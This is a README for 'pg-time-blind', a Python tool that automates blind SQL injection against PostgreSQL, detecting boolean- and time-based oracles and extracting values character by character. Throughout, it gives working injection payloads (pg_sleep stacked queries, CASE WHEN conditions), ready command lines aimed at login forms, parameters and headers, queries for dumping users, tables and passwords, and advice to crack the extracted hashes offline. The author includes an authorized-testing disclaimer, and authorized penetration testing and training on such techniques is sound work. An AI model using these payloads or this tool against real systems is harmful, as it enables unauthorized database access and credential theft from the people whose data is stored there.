# pg-time-blind

A small, dependency-light **PostgreSQL blind SQL injection** data extractor.

When a target only leaks data through *whether a condition is true* — either by
changing the response (**boolean-based**) or by how long it takes to respond
(**time-based** `pg_sleep` oracle) — this tool pulls a value out automatically in
one command, no sqlmap. It binary-searches the ASCII value of each character
(~7 requests/char instead of brute-forcing all 95 printable characters), so
extraction is fast and predictable.

It is deliberately **generic**: the injection point, HTTP method, parameter name,
and payload shape are all configurable, so it works against any PostgreSQL target
with a blind injection — not just one specific app.

---

## ⚠️ Legal / ethical use

This tool is for **authorized security testing and education only** — your own systems,
lab machines (e.g. OffSec Proving Grounds, HackTheBox), or targets you have **explicit written
permission** to test. Unauthorized access to computer systems is illegal in most jurisdictions.
You are solely responsible for how you use it. The author accepts no liability for misuse.

---

## What's new (v2 — structured detection)

The tool now runs in **two phases** instead of assuming a single time-based preset:

1. **Detection** — it auto-discovers the injection **context** *and* the blind **type**:
   - **Boolean-based** is tried first because it needs no waiting (much faster). TRUE vs
     FALSE is told apart by **auto-calibration**: the tool sends a known-true and a
     known-false payload and diffs **status code → body length → a unique body token**
     to pick a reliable discriminator.
   - **Time-based** (`pg_sleep`) is used as a **fallback** when boolean produces no signal.
2. **Extraction** — uses whichever oracle was detected, with the same per-character binary search.

You no longer have to guess `--preset`; the context (`stacked`, `string-and`, `string-or`,
`numeric-and`, `numeric-or`) is detected for you. You can still pin everything manually.

---

## Features

- **Auto-detects boolean-based *and* time-based** blind injection, preferring the faster boolean path
- **Auto-calibration** of the TRUE/FALSE signal (status code / body length / body token)
- Auto-discovers the injection **context** (no manual `--preset`)
- Binary search per character (~7 requests/char)
- Inject into **URL**, **body**, or a **header** via a placeholder marker
- Works with `GET`, `POST`, or any method
- Manual overrides: `--context`, `--force-boolean`, `--force-time`, `--true-match`, `--false-match`, custom `--template`
- Load a raw Burp/ZAP request file with `--request`
- **Resume/checkpoint**: progress is saved per character — re-run the same command to continue after an interruption
- Jitter-resistant time mode: re-confirms positives (`--retries`)
- No heavy dependencies — just `requests`

---

## Requirements

- Python 3.7+
- [`requests`](https://pypi.org/project/requests/)

```bash
pip install -r requirements.txt
```

---

## Quick start

```bash
git clone https://github.com/SirReddington/pg-time-blind.git
cd pg-time-blind
pip install -r requirements.txt
python3 pg_time_blind.py --help
```

---

## How it works

1. You mark the injection point in the request with a placeholder (default: `INJECT`).
2. **Phase 1 — detection.** For each candidate context the tool builds a known-TRUE and
   known-FALSE payload:
   - It first checks for a **boolean** signal by calibrating on the responses
     (different status code, a stable body-length gap, or a token that only appears in one).
   - If no boolean signal is found, it checks whether a TRUE condition **delays** the
     response (and a FALSE one doesn't) → **time-based**.
3. **Phase 2 — extraction.** Using the detected true/false oracle it finds the value's
   length, then binary-searches each character by its ASCII code.

Example of a generated payload (time-based, `stacked` context):

```sql
';SELECT pg_sleep(3) WHERE ascii(substr((SELECT password FROM users WHERE username='bob'),1,1))>77--
```

Example of a generated payload (boolean, `string-and` context):

```sql
' AND (ascii(substr((SELECT password FROM users WHERE username='bob'),1,1))>77)--
```

---

## Usage

```
python3 pg_time_blind.py --query "<SQL scalar>" [target] [detection opts] [tuning]
```

### Target (choose one style)

| Flag | Meaning |
|------|---------|
| `-u, --url`      | Target URL (may contain the marker for GET injection) |
| `-d, --data`     | Request body (may contain the marker) |
| `-H, --header`   | Extra header `'Name: value'`, repeatable (may contain the marker) |
| `-X, --method`   | HTTP method (default: `POST` if `-d` given, else `GET`) |
| `--request`      | Raw HTTP request file containing the marker |
| `--proto`        | Scheme for `--request` files (default `http`) |

### Injection

| Flag | Meaning |
|------|---------|
| `--query`     | **(required)** SQL scalar to extract, e.g. `"SELECT password FROM users WHERE username='bob'"` |
| `--marker`    | Placeholder string for the injection point (default `INJECT`) |
| `--template`  | Custom payload template using `{cond}` (and `{sleep}` for time-based); overrides context discovery |
| `--no-encode` | Do **not** URL-encode the payload |

### Detection

| Flag | Meaning |
|------|---------|
| `--context`        | Pin the injection context: `stacked`, `string-and`, `string-or`, `numeric-and`, `numeric-or` (skips context discovery) |
| `--force-boolean`  | Only use boolean-based blind |
| `--force-time`     | Only use time-based blind |
| `--true-match`     | String present **only** in a TRUE response (overrides auto-calibration) |
| `--false-match`    | String present **only** in a FALSE response (overrides auto-calibration) |
| `--len-margin`     | Min body-length gap (chars) to treat as a boolean signal (default `12`) |
| `--len-jitter`     | Allowed body-length wobble within one response type (default `4`) |

### Tuning

| Flag | Default | Meaning |
|------|---------|---------|
| `--sleep`     | `3.0` | Seconds for `pg_sleep` (time-based only) |
| `--threshold` | `sleep*0.6` | Response time counted as "slept" |
| `--retries`   | `1` | Re-confirm each time-based positive N times (beats network jitter) |
| `--maxlen`    | `64` | Max value length to probe |
| `--cmin/--cmax` | `32/126` | ASCII bounds for the binary search |
| `--proxy`     | – | e.g. `http://127.0.0.1:8080` to view in Burp |

### Resume

| Flag | Meaning |
|------|---------|
| `--state` | Checkpoint file path (default: auto-named `.pgtb-<id>.json` in the current dir) |
| `--fresh` | Ignore any existing checkpoint and start over |

---

## Injection contexts

The detector tries these in order (`foo` = the original value). Each has a boolean form
and/or a time form; boolean is preferred when it produces a signal.

| Context       | Boolean payload            | Time payload |
|---------------|----------------------------|--------------|
| `stacked`     | *(time only)*              | `foo';SELECT pg_sleep(s) WHERE {cond}--` |
| `string-and`  | `foo' AND ({cond})--`      | `foo' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep(s)) ELSE 1 END)=1--` |
| `string-or`   | `foo' OR ({cond})--`       | `foo' OR (CASE WHEN ({cond}) THEN ...)=1--` |
| `numeric-and` | `foo AND ({cond})--`       | `foo AND (CASE WHEN ({cond}) THEN ...)=1--` |
| `numeric-or`  | `foo OR ({cond})--`        | `foo OR (CASE WHEN ({cond}) THEN ...)=1--` |

Need something unusual (extra parentheses, different comment, no closing quote)? Use
`--template` with your own string containing `{cond}` (add `{sleep}` for time-based).

---

## Examples

**1. Login form, POST body — fully automatic (detect context + type, then extract)**

```bash
python3 pg_time_blind.py \
  -u http://10.10.10.10:3000/login \
  -d "username=INJECT&password=test" \
  --query "SELECT password FROM users WHERE username='admin'"
```

**2. Reuse a saved Burp request** (put `INJECT` where the payload goes)

```bash
python3 pg_time_blind.py --request req.txt \
  --query "SELECT current_user"
```

**3. Numeric GET parameter, pin the context, force time-based**

```bash
python3 pg_time_blind.py \
  -u "http://target/item?id=INJECT" \
  --force-time --context numeric-and \
  --query "SELECT version()"
```

**4. Header injection**

```bash
python3 pg_time_blind.py -u http://target/ \
  -H "X-Forwarded-For: INJECT" \
  --query "SELECT usename FROM pg_user LIMIT 1"
```

**5. Help the boolean calibrator on a noisy page**

```bash
python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
  --true-match "Dashboard" \
  --query "SELECT current_user"
```

**6. Custom template (full control, time-based)**

```bash
python3 pg_time_blind.py -u http://t/x -d "q=INJECT" \
  --template "1)) AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1-- -" \
  --query "SELECT string_agg(usename,',') FROM pg_user"
```

---

## Sample output

```
=== PHASE 1: detection ===
[*] probing boolean   : string-and ...
[+] boolean signal on string-and: status==302

[+] TYPE   : boolean-based
[+] DETAIL : context=string-and signal=status==302
[*] detection cost: 8 requests

=== PHASE 2: extraction ===
[*] query  : SELECT password FROM users WHERE username='admin'
[*] state  : .pgtb-a1b2c3d4e5.json
[+] length = 11
[*] extracting: s3cr3tP@ss!

[+] RESULT: s3cr3tP@ss!
[*] total requests: 84  (type: boolean-based)
```

When no boolean signal exists, Phase 1 falls back automatically:

```
=== PHASE 1: detection ===
[*] probing boolean   : string-and ...
[*] probing boolean   : string-or ...
[*] probing boolean   : numeric-and ...
[*] probing boolean   : numeric-or ...
[*] probing time      : stacked ...
[+] time-based fires on stacked

[+] TYPE   : time-based
[+] DETAIL : context=stacked sleep=3.0s threshold=1.80s
```

---

## Useful queries to feed `--query`

| Goal | `--query` value |
|------|-----------------|
| Current DB user | `SELECT current_user` |
| Version | `SELECT version()` |
| Current database | `SELECT current_database()` |
| Is superuser | `SELECT current_setting('is_superuser')` |
| List users | `SELECT string_agg(usename,',') FROM pg_user` |
| List tables | `SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'` |
| Dump a password | `SELECT password FROM users WHERE username='admin'` |

---

## Tips

- **Boolean is faster than time** — let detection pick it. Only `--force-time` when the page
  is too dynamic to calibrate a reliable true/false difference.
- If auto-calibration mis-fires on a noisy page (CSRF tokens, timestamps), give it a hand with
  `--true-match`/`--false-match`, or raise `--len-margin`.
- If the result is a **hash**, extract it here, then crack it offline (e.g.
  `hashcat -m <mode> hash.txt rockyou.txt`) — far faster than guessing through the oracle.
- Raise `--sleep` (e.g. `5`) on slow/jittery networks for time-based; lower it (e.g. `2`) on fast local labs.
- Interrupted? Just re-run the **same** command — it resumes from the last extracted character.
- If detection finds nothing, your context or marker placement is likely wrong — not necessarily that the target is safe. Try `--context`, `--force-time`, or `--true-match`.

---

## Contributing

Issues and PRs welcome — especially additional contexts and other-DBMS support
(MySQL `SLEEP()`, MSSQL `WAITFOR DELAY`, Oracle `dbms_pipe.receive_message`).

## License

[MIT](LICENSE)
